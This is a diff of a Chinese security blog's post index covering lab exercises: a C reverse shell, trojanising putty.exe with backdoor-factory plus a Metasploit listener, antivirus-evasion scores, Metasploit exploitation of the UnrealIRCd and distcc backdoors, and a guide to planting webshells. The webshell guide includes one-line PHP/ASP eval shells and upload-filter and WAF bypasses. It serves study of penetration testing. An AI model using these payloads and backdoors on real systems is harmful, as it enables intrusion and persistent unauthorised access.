-<p><img src="https://img-blog.csdnimg.cn/20190413174133640.png" alt="在这里插入图片描述"></p>
-</li>
-<li><p>未经过编码的 x.exe 检测率是 37%</p>
-</li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/20190413174137778.png" alt="在这里插入图片描述"></p>
 <h4 id="7-自己编写后门"><a href="#7-自己编写后门" class="headerlink" title="7.自己编写后门"></a>7.自己编写后门</h4><ul>
 <li>Windows reverse shell</li>
 </ul>
@@ -6298,7 +6265,6 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 <figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># gcc linux_revers_shell.c -o linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试程序</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nc -nvlp 333</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ./linux 127.0.0.1 333</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8%5C20190413174142304.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20190413174147316.png" alt="在这里插入图片描述"></p>
 <ul>
 <li>linux_revers_shell.c</li>
 </ul>
@@ -6405,45 +6371,32 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 </ul>
 <figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">-c：code cave(代码裂缝)</span><br><span class="line">-l：代码裂缝大小</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe -c -l 200</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20190525145320244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <ul>
 <li><p>-s SHELL, –shell=SHELL: 可以使用的有效负载。使用“show”来查看有效载荷</p>
 <figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">root<span class="meta">@kali</span>:~# backdoor-<span class="keyword">factory</span> -f putty.exe -s <span class="keyword">show</span></span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
-<p><img src="https://img-blog.csdnimg.cn/201905251453287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">root<span class="meta">@kali</span>:~# backdoor-<span class="keyword">factory</span> -f `which nc` -s <span class="keyword">show</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20190525145334950.png" alt="在这里插入图片描述"></p>
 <ul>
 <li><p>注入 putty.exe，报错</p>
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> -o putty2.exe</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
-<p><img src="https://img-blog.csdnimg.cn/20190525145341279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">[!]</span> <span class="attr">Enter your selection:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20190525145347873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <ul>
 <li><p>显示未找到文件</p>
 <figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">Failed to read certificate <span class="string">file:</span> <span class="regexp">/usr/</span>share<span class="regexp">/backdoor-factory/</span>certs/Verisign.cer</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">02001002</span>:system <span class="string">library:</span><span class="string">fopen:</span>No such file or <span class="string">directory:</span>bss_file.<span class="string">c:</span><span class="number">175</span>:fopen(<span class="string">'/usr/share/backdoor-factory/certs/VerisignPrivateKey.pem'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">2006</span><span class="string">D080:</span>BIO <span class="string">routines:</span><span class="string">BIO_new_file:</span>no such <span class="string">file:</span>bss_file.<span class="string">c:</span><span class="number">182</span>:</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">02001002</span>:system <span class="string">library:</span><span class="string">fopen:</span>No such file or <span class="string">directory:</span>bss_file.<span class="string">c:</span><span class="number">175</span>:fopen(<span class="string">'/usr/share/backdoor-factory/certs/Verisign.cer'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">2006</span><span class="string">D080:</span>BIO <span class="string">routines:</span><span class="string">BIO_new_file:</span>no such <span class="string">file:</span>bss_file.<span class="string">c:</span><span class="number">182</span>:</span><br><span class="line">Failed</span><br><span class="line">File putty5.exe is <span class="keyword">in</span> the <span class="string">'backdoored'</span> directory</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>修复错误（备份并重命名）</p>
 <figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /usr/share/backdoor-factory/certs/</span></span><br><span class="line">passFile.txt           signingCert.cer        signingPrivateKey.pem  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cd /usr/share/backdoor-factory/certs/</span></span><br><span class="line">  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># cp signingCert.cer signingCert.cer.bak</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># mv signingCert.cer Verisign.cer</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># cp signingPrivateKey.pem signingPrivateKey.pem.bak</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># mv signingPrivateKey.pem VerisignPrivateKey.pem</span></span><br><span class="line">  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</span></span><br></pre></td></tr></table></figure>
-
 </li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/20190525145357145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<ul>
 <li><p>使用 msf 侦听</p>
 <figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/<span class="keyword">handler</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> LHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> LPORT <span class="number">4444</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; run</span><br></pre></td></tr></table></figure>
-
 </li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/20190525145405583.png" alt="在这里插入图片描述"></p>
-<ul>
 <li><p>windows 运行被注入 putty2.exe 程序，kali 反弹成功</p>
 </li>
 <li><p>免杀效果比较</p>
@@ -6458,7 +6411,6 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 
 </li>
 </ul>
-<p><img src="https://img-blog.csdnimg.cn/20190525145414174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h4 id="后门工具–Bdfproxy"><a href="#后门工具–Bdfproxy" class="headerlink" title="后门工具–Bdfproxy"></a>后门工具–Bdfproxy</h4><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
 <li>Bdfproxy（mitmproxy）<ul>
 <li>基于流量劫持（中间人攻击）动态注入 shellcode （ARP spoof、DNS spoof、Fake AP）</li>
@@ -6560,7 +6512,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 ]]></content>
   </entry>
   <entry>
-    <title>windows中常见提权方式总结</title>
+    <title>windows中常见提权方式总结(一)</title>
     <url>/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/</url>
     <content><![CDATA[<h2 id="渗透测试中常见提权方式总结（一）"><a href="#渗透测试中常见提权方式总结（一）" class="headerlink" title="渗透测试中常见提权方式总结（一）"></a>渗透测试中常见提权方式总结（一）</h2><h3 id="windows提权——本地提权"><a href="#windows提权——本地提权" class="headerlink" title="windows提权——本地提权"></a>windows提权——本地提权</h3><ul>
 <li>已实现本地低权限账号登录<ul>
@@ -7560,15 +7512,15 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
       </tags>
   </entry>
   <entry>
-    <title>msf攻击实验记录</title>
+    <title>经典漏洞msf攻击实验记录</title>
     <url>/2020/04/30/msf-gong-ji-shi-yan-ji-lu/</url>
-    <content><![CDATA[<h2 id="MSF攻击实验记录"><a href="#MSF攻击实验记录" class="headerlink" title="MSF攻击实验记录"></a>MSF攻击实验记录</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章记录一些自己使用msf进行的一些实验。</p>
-<h3 id="一、msf利用UnrealIRCd后门漏洞攻击"><a href="#一、msf利用UnrealIRCd后门漏洞攻击" class="headerlink" title="一、msf利用UnrealIRCd后门漏洞攻击"></a>一、msf利用UnrealIRCd后门漏洞攻击</h3><p><strong>攻击主机：</strong>Kali linux, IP地址：192.168.153.176</p>
+    <content><![CDATA[<h2 id="经典漏洞MSF攻击实验记录"><a href="#经典漏洞MSF攻击实验记录" class="headerlink" title="经典漏洞MSF攻击实验记录"></a>经典漏洞MSF攻击实验记录</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章记录一些自己使用msf进行的一些实验。</p>
+<h3 id="msf利用UnrealIRCd后门漏洞攻击"><a href="#msf利用UnrealIRCd后门漏洞攻击" class="headerlink" title="msf利用UnrealIRCd后门漏洞攻击"></a>msf利用UnrealIRCd后门漏洞攻击</h3><p><strong>攻击主机：</strong>Kali linux, IP地址：192.168.153.176</p>
 <p><strong>漏洞主机：</strong>linux   IP地址：192.168.153.131</p>
 <h4 id="nmap扫描开放端口"><a href="#nmap扫描开放端口" class="headerlink" title="nmap扫描开放端口"></a>nmap扫描开放端口</h4><p> 利用命令： nmap -sT -v 10.1.1.136 扫描漏洞主机开放端口信息,扫描结果如下</p>
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sT -v <span class="number">192.168</span><span class="number">.153</span><span class="number">.131</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="D:%5Cmsrf%5CQQ%E6%88%AA%E5%9B%BE20200429210327.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429210327.png" alt=""></p>
 <h4 id="UnrealIRCd后门漏洞简介"><a href="#UnrealIRCd后门漏洞简介" class="headerlink" title="UnrealIRCd后门漏洞简介"></a>UnrealIRCd后门漏洞简介</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">CVE：CVE<span class="number">-2010</span><span class="number">-2075</span></span><br><span class="line"></span><br><span class="line">BID：BID<span class="number">-40820</span></span><br><span class="line"></span><br><span class="line">OSVDB：OSVDB<span class="number">-65445</span></span><br></pre></td></tr></table></figure>
 
 <h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>​        在2009年11月到2010年6月间分布于某些镜面站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码，影响系统/软件 Unreal UnrealIRCd 3.2.8.1。</p>
@@ -7578,11 +7530,194 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 <figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">search unrealircd</span></span><br></pre></td></tr></table></figure>
 
 <p>命令搜索关于UnrealIRCD漏洞的利用信息</p>
-<p><img src="D:%5Cmsrf%5CQQ%E6%88%AA%E5%9B%BE20200429210558.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429210558.png" alt=""></p>
 <h5 id="设置漏洞利用exp"><a href="#设置漏洞利用exp" class="headerlink" title="设置漏洞利用exp"></a>设置漏洞利用exp</h5><p>使用’show options’ 命令查看该exploit的参数设置信息，发现执行该EXP前可以配置漏洞主机的IP和端口</p>
-<p><img src="D:%5Cmsrf%5CQQ%E6%88%AA%E5%9B%BE20200429211137.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429211137.png" alt=""></p>
 <h5 id="执行查看结果"><a href="#执行查看结果" class="headerlink" title="执行查看结果"></a>执行查看结果</h5><p>运行linux系统命令“whoami”，回显“root”说明当前shell的权限是root权限，可进行任意操作而不受权限控制，</p>
-<p><img src="D:%5Cmsrf%5CQQ%E6%88%AA%E5%9B%BE20200429211204.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429211204.png" alt=""></p>
+<h3 id="利用Distcc后门漏洞攻击"><a href="#利用Distcc后门漏洞攻击" class="headerlink" title="利用Distcc后门漏洞攻击"></a>利用Distcc后门漏洞攻击</h3><h4 id="Distcc后门漏洞"><a href="#Distcc后门漏洞" class="headerlink" title="Distcc后门漏洞"></a>Distcc后门漏洞</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">安全组织索引</span><br><span class="line">CVE：CVE<span class="number">-2004</span><span class="number">-2687</span></span><br><span class="line">BID：无</span><br><span class="line">OSVDB：OSVDB<span class="number">-13378</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><pre><code>Distcc用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是XCode 1.5版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制，影响系统 distcc 2.x</code></pre><h4 id="攻击过程-1"><a href="#攻击过程-1" class="headerlink" title="攻击过程"></a>攻击过程</h4><ol>
+<li><h5 id="开启Msfconsole"><a href="#开启Msfconsole" class="headerlink" title="开启Msfconsole"></a>开启Msfconsole</h5><p>运行<code>msfconsole</code>命令开启msf</p>
+</li>
+<li><h5 id="搜索漏洞利用EXP"><a href="#搜索漏洞利用EXP" class="headerlink" title="搜索漏洞利用EXP"></a>搜索漏洞利用EXP</h5><p>运行<code>search distcc</code>命令搜索关于Distcc_exec 漏洞的利用信息</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429211425.png" alt=""></p>
+</li>
+</ol>
+<ol start="3">
+<li><h5 id="运行漏洞利用EXP"><a href="#运行漏洞利用EXP" class="headerlink" title="运行漏洞利用EXP"></a>运行漏洞利用EXP</h5><p>运行<code>use exploit/unix/misc/distcc_exec</code>命令开始运行EXP</p>
+</li>
+</ol>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429211846.png" alt=""></p>
+<p>设置漏洞主机IP</p>
+<p>运行<code>set RHOST 10.1.1.136</code>命令设置漏洞主机IP</p>
+<p>运行<code>exploit</code>命令，成功建立shell回话</p>
+<h5 id="6-验证shell权限"><a href="#6-验证shell权限" class="headerlink" title="6.验证shell权限"></a>6.验证shell权限</h5><p>运行linux系统命令“whoami”，回显“root”说明当前shell的权限是root权限，可进行任意操作而不受权限控制.</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429212150.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>拿WebShell 方法</title>
+    <url>/2020/04/30/na-webshell-fang-fa/</url>
+    <content><![CDATA[<h2 id="拿WebShell-方法"><a href="#拿WebShell-方法" class="headerlink" title="拿WebShell 方法"></a>拿WebShell 方法</h2><h3 id="拿WebShell-的两种类型"><a href="#拿WebShell-的两种类型" class="headerlink" title="拿WebShell 的两种类型"></a>拿WebShell 的两种类型</h3><ul>
+<li>管理权限拿WebShell （可以理解为进后台拿WebShell）</li>
+<li>普通权限拿WebShell（可以理解为不进后台拿WebShell）</li>
+</ul>
+<p>下面附一张拿WebShell的思维导图，图如下：</p>
+<p> <img src="https://img-blog.csdnimg.cn/20190816232239336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" alt="img"></p>
+<h4 id="管理权限拿WebShell-常见的方法归纳为14种："><a href="#管理权限拿WebShell-常见的方法归纳为14种：" class="headerlink" title="管理权限拿WebShell 常见的方法归纳为14种："></a>管理权限拿WebShell 常见的方法归纳为14种：</h4><h5 id="1、正常上传"><a href="#1、正常上传" class="headerlink" title="1、正常上传"></a>1、正常上传</h5><ul>
+<li><p>网站对上传文件后缀格式并未过滤，直接上传WebShell即可</p>
+<p>大概思路是，已知后台管理员账号和密码，找有上传节点的地方，写一个隐蔽或变形的木马上传，上传成功后，用菜刀或蚁剑连接。</p>
+<p> 注：为什么要写一个隐蔽或变形的木马呢？因为如果你用的常见的木马，只要一上传就会被管理员或WAF发现（常见的木马WAF都是有收集的，所以可以写完木马之后用D盾检查一下，被WAF检测出来的危险等级是多少）</p>
+</li>
+</ul>
+<h5 id="2、数据库备份拿WebShell"><a href="#2、数据库备份拿WebShell" class="headerlink" title="2、数据库备份拿WebShell"></a>2、数据库备份拿WebShell</h5><p>​        网站对上传的文件后缀进行过滤，不允许上传脚本类型文件如 asp、php、jsp、aspx等。而网站具有数据库备份功能，这时我们就可以将WebShell格式先改为允许上传的文件格式，然后，我们找到上传后的文件路径，通过数据库备份，将文件备份为脚本格式。</p>
+<p>注：</p>
+<ul>
+<li>1）有些备份数据库的地方，限制了用户更改路径，那该怎么办？</li>
+</ul>
+<p>F12打开开发者工具，修改文本框元素的value值为我们想要的路径或格式就可以完成修改</p>
+<ul>
+<li><p>如果上传的格式被限制呢？该怎么办？</p>
+<p>可以使用%00截断来绕过上传限制或使用BurpSuite 工具（%00截断、特殊名文件名绕过、文件名大小写绕过等等黑白名单绕过，</p>
+</li>
+</ul>
+<h5 id="3、本地js验证突破拿WebShell"><a href="#3、本地js验证突破拿WebShell" class="headerlink" title="3、本地js验证突破拿WebShell"></a><strong>3、本地js验证突破拿WebShell</strong></h5><p> 当网站设置了js来限制用户上传的文件类型时，可以通过删除js验证或者修改上传类型突破上传拿WebShell。</p>
+<p>   使用BurpSuite 或者是 Fiddle等代理工具提交，本地文件先更改为jpg，上传时拦截，再把文件扩展名更改为asp或者php即可</p>
+<h5 id="4、上传其它脚本类型拿WebShell"><a href="#4、上传其它脚本类型拿WebShell" class="headerlink" title="4、上传其它脚本类型拿WebShell"></a><strong>4、上传其它脚本类型拿WebShell</strong></h5><ul>
+<li>此类型用于一台服务器具有多个网站，a网站是asp的站，b可能是php的站，而a站中限制了上传文件类型为asp的文件，你可以尝试上传php的脚本，来拿Shell</li>
+</ul>
+<ul>
+<li>你也可以尝试将脚本文件后缀名改为asa 或者在后面直接加个点（.）如”xx.asp.” 来突破文件类型限制进行上传拿WebShell</li>
+</ul>
+<h5 id="5、-00截断拿WebShell"><a href="#5、-00截断拿WebShell" class="headerlink" title="5、%00截断拿WebShell"></a><strong>5、%00截断拿WebShell</strong></h5><ul>
+<li>在上传文件的时候，你上传的文件名可能会被网站自动改成别的名字，这个时候你可以尝试抓取上传文件数据包，将文件名改为xx.asp%00.jpg进行截断上传，拿WebShell</li>
+</ul>
+<h5 id="6、利用解析漏洞拿WebShell"><a href="#6、利用解析漏洞拿WebShell" class="headerlink" title="6、利用解析漏洞拿WebShell"></a><strong>6、利用解析漏洞拿WebShell</strong></h5><ul>
+<li>IIS5.x / 6.0 解析漏洞</li>
+<li>IIS 7.0 / IIS 7.5 / Nginx &lt;8.03 畸形解析漏洞</li>
+<li>Nginx &lt; 8.03 空字节代码执行漏洞</li>
+<li>Apache 解析漏洞</li>
+</ul>
+<h5 id="7、利用编辑器漏洞拿WebShell"><a href="#7、利用编辑器漏洞拿WebShell" class="headerlink" title="7、利用编辑器漏洞拿WebShell"></a><strong>7、利用编辑器漏洞拿WebShell</strong></h5><p>​         利用网站的编辑器上传木马，搜索已知的编辑器漏洞，常见的编辑器有 fckeditor、ewebeditor、cheditor等，有时候没有管理员权限也可以拿下webshell。</p>
+<h5 id="8、网站配置插马拿WebShell"><a href="#8、网站配置插马拿WebShell" class="headerlink" title="8、网站配置插马拿WebShell"></a><strong>8、网站配置插马拿WebShell</strong></h5><p>​            通过找到网站默认配置，将一句话插入到网站配置中，不过为了能够成功执行插马，建议先下载该站源码，进行查看源码过滤规则，以防插马失败。</p>
+<p>PS：插马失败很有可能会导致网站被你写的一句话木马，没有闭合标签导致被网站被插废。</p>
+<p> <code>&quot;%&gt;&lt;%eval request(&quot;cracer&quot;)%&gt;&lt;%&#39;</code><br>            注意：我这里构造的是下载了程序的源码，然后在config.asp文件里的代码来修改的。不同的版本的网站源码都不一样，实际问题实际分析，在此就不做多的解释了。这里最后的单引号（’）是注释当前行后面所有的内容。</p>
+<h5 id="9、通过编辑模块拿WebShell"><a href="#9、通过编辑模块拿WebShell" class="headerlink" title="9、通过编辑模块拿WebShell"></a><strong>9、通过编辑模块拿WebShell</strong></h5><ul>
+<li>通过对网站的模块进行编辑写入一句话，然后生成脚本文件拿WebShell</li>
+<li>通过将木马添加到压缩文件，把名字改为网站模板类型，上传到网站服务器，拿WebShell</li>
+</ul>
+<h5 id="10、修改脚本直接拿WebShell"><a href="#10、修改脚本直接拿WebShell" class="headerlink" title="10、修改脚本直接拿WebShell"></a><strong>10、修改脚本直接拿WebShell</strong></h5><p> 有的网站可以修改添加脚本文件，可以直接拿WebShell</p>
+<p>注：织梦的后台，大家可以下个织梦后台网站源码，复现一下</p>
+<h5 id="11、数据库命令执行拿WebShell"><a href="#11、数据库命令执行拿WebShell" class="headerlink" title="11、数据库命令执行拿WebShell"></a>11、数据库命令执行拿WebShell</h5><p>可以通过phpmyadmin 登录数据库使用数据库命令来写如一句话拿WebShell</p>
+<p><strong>大致步骤：</strong></p>
+<ul>
+<li>创建表</li>
+<li>将一句话写入刚创建的表中</li>
+<li>查询一句话所在表到文件，成功将一句话写入文件</li>
+<li>注：这个前提条件是需要有一定的数据库权限</li>
+</ul>
+<h5 id="12、上传特殊木马拿WebShell"><a href="#12、上传特殊木马拿WebShell" class="headerlink" title="12、上传特殊木马拿WebShell"></a>12、上传特殊木马拿WebShell</h5><p>一些网站安装了WAF 安全狗、360，我们可以通过上传一些免杀马，变形木马来进行突破封杀</p>
+<h5 id="13、文件包含拿WebShell"><a href="#13、文件包含拿WebShell" class="headerlink" title="13、文件包含拿WebShell"></a>13、文件包含拿WebShell</h5><p>先将WebShell 改为txt格式文件上传，然后上传一个脚本文件包含该txt格式文件，可绕过WAF拿WebShell</p>
+<p>   ASP 包含：</p>
+<p><code>&lt;!--#include file = &quot;1.jpg&quot;--&gt;</code></p>
+<ol start="2">
+<li><p>调用的文件必须和被调用文件在同一目录，否则找不到</p>
+</li>
+<li><p>如果不在同一目录，用下面的语句：</p>
+<p> <code>&lt;!--#include virtual=&quot;文件所在目录/1.jpg&quot;--&gt;</code><br>  PHP 包含：</p>
+</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">   <span class="keyword">include</span>(<span class="string">'1.jpg'</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>注：这种情况一般是，我们已经通过菜刀拿下了权限了，假设菜刀一句话木马可以过安全狗，但大马却怎么都没有上传成功，绕过安全狗</p>
+<p>解决发现大马上传不了，被防火墙或者安全狗拦截时，可以考虑使用包含文件</p>
+<p>思路如下：</p>
+<pre><code> 1）先上传一个含有包含代码（如&lt;!-- #include file=&quot;x.jpg&quot; --&gt;）却没有攻击代码的文件，不会被狗拦
+ 2）再将大马改成jpg图片文件上传，也不会被狗拦
+ 3）访问第一次上传的包含函数的文件，会发现执行了木马
+ 4）这里是因为包含函数包含的文件会被当成脚本文件，直接将文件内容插入到这个文件中
+
+这是因为包含函数包含的文件会被当成脚本文件，直接将文件内容插入到这个文件中</code></pre><h5 id="14、另类拿WebShell"><a href="#14、另类拿WebShell" class="headerlink" title="14、另类拿WebShell"></a>14、另类拿WebShell</h5><ul>
+<li><p>更新页面拿Shell</p>
+<ul>
+<li>在网站模板中的404页面中插入一句话木马，之后找到这个页面的绝对路径，访问之即可拿Shell</li>
+</ul>
+</li>
+<li><p>上传插件拿Shell</p>
+<ul>
+<li>将木马放入zip压缩文件中，最好是网站插件的压缩文件，之后再后台安装插件，选中含有木马的压缩文件，会自动将插件连通木马安装在网站目录下，接下来我们只需要寻找到木马的绝对路径即可</li>
+</ul>
+</li>
+<li><p>上传特殊马拿WebShell</p>
+</li>
+<li><p>还有一种就是我们之前说那种通过上传一些免杀马，变形木马来进行突破封杀</p>
+</li>
+</ul>
+<h4 id="普通权限拿WebShell-常见的方法归纳为7种："><a href="#普通权限拿WebShell-常见的方法归纳为7种：" class="headerlink" title="普通权限拿WebShell 常见的方法归纳为7种："></a>普通权限拿WebShell 常见的方法归纳为7种：</h4><p>普通权限拿WebShell 是啥？</p>
+<pre><code>可以理解为不进后台拿WebShell</code></pre><p>常见方法归纳为六种：</p>
+<h5 id="1、0day-拿WebShell"><a href="#1、0day-拿WebShell" class="headerlink" title="1、0day 拿WebShell"></a>1、0day 拿WebShell</h5><p>​    网上有很多理论知识,自己搜索CMS是discz的相关oday，看看能不能复现</p>
+<h5 id="2、修改网站上传类型配置来拿WebShell"><a href="#2、修改网站上传类型配置来拿WebShell" class="headerlink" title="2、修改网站上传类型配置来拿WebShell"></a>2、修改网站上传类型配置来拿WebShell</h5><p>​    某些网站，在网站上传类型中限制了上传脚本类型文件，我们可以去添加上传文件类型如添加asp | php | jsp | aspx | asa 后缀名来拿WebShell</p>
+<h5 id="3、xss和sql注入联合利用"><a href="#3、xss和sql注入联合利用" class="headerlink" title="3、xss和sql注入联合利用"></a>3、xss和sql注入联合利用</h5><p>​        有些输入框对一些符号过滤不严密（如&lt;&gt;，所以一般存在xss的地方就可以这么利用）我们可以在这里输入一句话<?php @eval($_POST['CE']);?>之后再用数据库注入，查询到文件into file成功插入一句话木马</p>
+<h5 id="4、IIS写权限拿WebShell"><a href="#4、IIS写权限拿WebShell" class="headerlink" title="4、IIS写权限拿WebShell"></a>4、IIS写权限拿WebShell</h5><p>​            有些网站的管理员在配置网站权限的时候疏忽，导致我们有写权限，这种漏洞需要用工具来利用，在这里就不说了，只是提一下。而且已经很少见了，有专门的利用工具（桂林老兵），原理是通过找到有IIS 写入权限的网站（开启WebDeV），PUT进去一个.txt 格式的文件，目录必须有刻写的权限，如 image 文件夹，然后通过move 方法，把txt 格式的木马用move 成脚本格式。</p>
+<pre><code>例如：一开始上传的是test.txt    move 成 test1.asp</code></pre><h5 id="5、远程命令执行拿WebShell"><a href="#5、远程命令执行拿WebShell" class="headerlink" title="5、远程命令执行拿WebShell"></a>5、远程命令执行拿WebShell</h5><p>   执行命令行命令“写入内容到文件<strong>“<code>echo ?php</code>“<code>@eval($_POST[</code>‘cmd’<code>]);?&gt;</code>“<code>&gt; x.php</code></strong> 会自动将创建木马文件并将一句话木马写入其中，使用菜刀连接即可。</p>
+<h5 id="6、头像上传拿WebShell"><a href="#6、头像上传拿WebShell" class="headerlink" title="6、头像上传拿WebShell"></a><strong>6、头像上传拿WebShell</strong></h5><p>用户注册后有些网站可以上传图片、附件、文件、压缩包等，可以利用上传拿WebShell</p>
+<p>大概思路：</p>
+<ul>
+<li>将大马放在文件夹中</li>
+<li>将文件夹压缩成压缩文件（zip）</li>
+<li>正常上传一个头像并且抓包</li>
+<li>将数据包中图片头像的内容部分删掉</li>
+<li>重新写入文件内容，将压缩文件写入到原本图片的位置</li>
+<li>上传<br>之后返回包中会告诉我们绝对路径</li>
